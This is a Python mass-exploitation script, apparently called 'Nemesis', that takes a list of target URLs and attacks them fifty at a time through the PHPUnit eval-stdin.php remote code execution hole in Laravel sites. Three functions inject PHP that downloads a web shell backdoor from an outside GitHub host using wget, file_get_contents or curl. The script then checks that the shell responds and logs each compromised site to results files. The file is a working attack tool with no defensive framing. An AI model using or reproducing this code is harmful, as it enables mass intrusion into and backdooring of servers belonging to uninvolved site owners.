import os, time, re
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
import requests as r
import requests as req
from colorama import Fore, Style

def screen_clear():
    if os.name == "nt":
	    os.system("cls")
    else:
	    os.system("clear")


bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}




def laravelrce1(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php system("wget https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php -O nemesis.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'Linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('Results/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php', timeout=5)
            if '0xtn' in CheckShell.text:
                print(f"{gr}#=======>>> Goodluck Shell was Uploaded : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php")
                open('Results/Shelled_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php\n")
                open('Results/Result_Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php\n")
            else:
                print(f"{red}$-------> Unlucky not Uploaded : {url}")
        else:
            print(f"{red}$-------> Unlucky not Vuln :  {url}")
    except:
        pass

def laravelrce2(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php fwrite(fopen("nemesis.php","w+"),file_get_contents("https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php")); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('Results/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php', timeout=5)
            if '0xtn' in CheckShell.text:
                print(f"{gr}#=======>>> Goodluck Shell was Uploaded : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php")
                open('Results/Shelled_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php\n")
                open('Results/Result_Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php\n")
            else:
                print(f"{red}$-------> Unlucky not Uploaded : {url}")
        else:
            print(f"{red}$-------> Unlucky not Vuln :  {url}")
    except:
        pass



def laravelrce3(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        upshell = '<?php system("curl -O https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php); system("mv up.php nemesis.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('Results/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php', timeout=5)
            if 'NemesisUP' in CheckShell.text:
                print(f"{gr}#=======>>> Goodluck Shell was Uploaded : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php")
                open('Results/Shelled_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php\n")
                open('Results/Result_Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php\n")
            else:
                print(f"{red}$-------> Unlucky not Uploaded : {url}")
        else:
            print(f"{red}$-------> Unlucky not Vuln :  {url}")
    except:
        pass

def up(url):
    url = url.strip()
    try:
       laravelrce1(url)
       laravelrce2(url)
       laravelrce3(url)
    except:
       pass

def main():
    print(f'''
       __  ___                   ___         __        __  __         _____ __         ____{wh}
       /  |/  /___ _{gr}NEMESIS_{res}___   /   | __  __/ /_____  / / / /___     / ___// /_  ___ {red} / / /
      / /|_/ / __ `/ ___/ ___/  / /| |/ / / / __/ __ \/ / / / __ \    \__ \/ __ \/ _ \/ / / {bl}
     / /  / / /_/ (__  |__  )  / ___ / /_/ / /_/ /_/ / /_/ / /_/ /   ___/ / / / /  __/ / /  {wh}
   {yl} /_/  /_/\__,_/____/____/  /_/  |_\__,_/\__/\____/\____/ .___/   /____/_/ /_/\___/_/_/   {yl}
                                                     {wh}        GitHub : {red}MataKucing-OFC{res}
    ''')
    list = input(f"{gr}Give Me Your List.txt@{red}Nemesis> {gr}${res} ")
    url = open(list, 'r').readlines()
    try:
       ThreadPool = Pool(50)
       ThreadPool.map(up, url)
       ThreadPool.close()
       ThreadPool.join()
    except:
       pass

if __name__ == '__main__':
    screen_clear()
    main()
